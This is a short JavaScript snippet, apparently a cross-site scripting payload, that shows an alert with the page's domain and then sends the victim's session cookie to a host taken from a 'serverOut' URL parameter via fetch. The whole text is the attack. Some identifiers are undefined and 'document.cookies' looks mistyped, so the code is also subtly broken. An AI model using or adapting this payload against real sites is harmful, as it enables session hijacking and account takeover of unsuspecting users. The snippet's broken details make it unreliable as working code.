function alertAndExtractSessionCookie(key){
    alert(document.domain)
    let serverOut = urlParams.get("serverOut");
    if (!!serverOut){
        fetch(`${serverOut}?session=${encodeURIComponent(document.cookies)}`);
    }
}

function main(){
    alertAndExtractSessionCookie(pathKey);
}

main();